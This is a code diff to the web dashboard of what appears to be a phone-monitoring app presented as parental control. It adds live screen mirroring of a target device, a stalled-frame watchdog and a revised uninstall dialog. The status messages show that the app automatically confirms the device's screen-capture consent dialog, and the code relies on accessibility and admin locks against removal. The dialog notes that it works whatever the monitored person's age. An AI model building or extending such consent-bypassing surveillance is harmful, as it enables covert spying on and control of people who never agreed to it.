@@ -15,6 +15,8 @@ const S = {
   mirrorOn: false,
   frameCount: 0,
   lastFpsAt: 0,
+  lastFrameAt: 0,      // ms of last mirror frame received (status watchdog)
+  streaming: false,    // child-reported mirroring state (mirror_state)
   map: null,
   marker: null,
   track: [],
@@ -437,6 +439,21 @@ function handleWs(m) {
       if (m.cid === S.cid) { S.apps = m.apps || []; renderApps(); }
       break;
     }
+    case "mirror_state": {
+      // Child's real mirroring state — LIVE badge aur status hint isi se chalte hain.
+      if (m.cid === S.cid) {
+        S.streaming = !!m.streaming;
+        if (S.streaming) {
+          S.lastFrameAt = Date.now(); // grace window for the "no frames" watchdog
+          mirrorStatus("Child screen mirroring chalu ho gaya ✓", false);
+        } else if (S.mirrorOn) {
+          mirrorStatus("Consent dialog auto-confirm ho raha hai… (5–20 sec)", true);
+        } else {
+          mirrorStatus("", false);
+        }
+      }
+      break;
+    }
     case "pairing": { refreshChildren(); break; }
     default: break;
   }
@@ -471,8 +488,8 @@ $("quick-grid").querySelectorAll("[data-cmd]").forEach((b) => {
 });
 
 function releaseProtections() {
-  dialog("Release protections?",
-    "<p>Child device par accessibility + admin disable hoga, monitoring band hogi aur system uninstall dialog khulega. Continue?</p>",
+  dialog("Uninstall child app?",
+    "<p>Child ki age kuch bhi ho, ye kaam karega. Child device par accessibility + admin disable hoga, monitoring band hogi aur system uninstall dialog khud khulega — wahan se app uninstall ho jayegi. Ye action undo nahi hota (dobara setup karna padega). Continue?</p>",
     () => sendCmd("release_protections"));
 }
 $("release-btn").onclick = releaseProtections;
@@ -690,32 +707,67 @@ function renderFenceList() {
 }
 
 /* ---------------- mirror ---------------- */
+function mirrorStatus(text, show) {
+  const el = $("mirror-status");
+  if (!el) return;
+  el.textContent = text || "";
+  el.classList.toggle("hidden", !show || !text);
+}
+
 function onMirrorFrame(buf) {
   const blob = new Blob([buf], { type: "image/jpeg" });
   $("mirror-img").src = URL.createObjectURL(blob);
   S.frameCount++;
+  S.lastFrameAt = Date.now();
   const now = Date.now();
   if (now - S.lastFpsAt > 1000) {
     $("mirror-fps").textContent = S.frameCount + " fps";
     S.frameCount = 0; S.lastFpsAt = now;
   }
+  // Frames aa rahe hain -> consent clearly grant ho gaya, status hint hata do.
+  if (S.mirrorOn) mirrorStatus("", false);
 }
+
+// Agar mirroring chalu hai par 12 s se koi frame nahi aaya to bata do kya ho
+// raha hai — "cast icon par screen kaali" ka sabse common reason: consent abhi
+// auto-confirm ho raha hai, ya child ki screen OFF hai (off screen se frames
+// nahi bante).
+setInterval(() => {
+  if (!S.mirrorOn) return;
+  const idle = Date.now() - (S.lastFrameAt || 0);
+  if (idle > 12000) {
+    mirrorStatus(
+      "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — child ka screen OFF hai ya consent abhi confirm ho raha hai. Child phone ka screen ON karo, phir khud aa jayenge.",
+      true
+    );
+  } else {
+    mirrorStatus("", false);
+  }
+}, 3000);
 
 $("mirror-start").onclick = () => {
   if (!S.cid) return;
   if (S.ws && S.ws.readyState === 1) {
+    S.ws.send(JSON.stringify({ type: "watch_mirror", cid: S.cid }));
     S.ws.send(JSON.stringify({ type: "mirror_start", cid: S.cid }));
     S.mirrorOn = true;
+    S.lastFrameAt = Date.now();
     $("mirror-start").classList.add("hidden");
     $("mirror-stop").classList.remove("hidden");
+    mirrorStatus("Child par consent dialog auto-confirm ho raha hai… (5–20 sec)", true);
   } else alert("Not connected");
 };
 $("mirror-stop").onclick = () => {
-  if (S.ws && S.ws.readyState === 1) S.ws.send(JSON.stringify({ type: "mirror_stop", cid: S.cid }));
+  if (S.ws && S.ws.readyState === 1) {
+    S.ws.send(JSON.stringify({ type: "mirror_stop", cid: S.cid }));
+    S.ws.send(JSON.stringify({ type: "watch_mirror", cid: "" }));
+  }
   S.mirrorOn = false;
+  S.streaming = false;
   $("mirror-start").classList.remove("hidden");
   $("mirror-stop").classList.add("hidden");
   $("mirror-fps").textContent = "";
+  mirrorStatus("", false);
 };
 
 /* ---------------- alerts ---------------- */
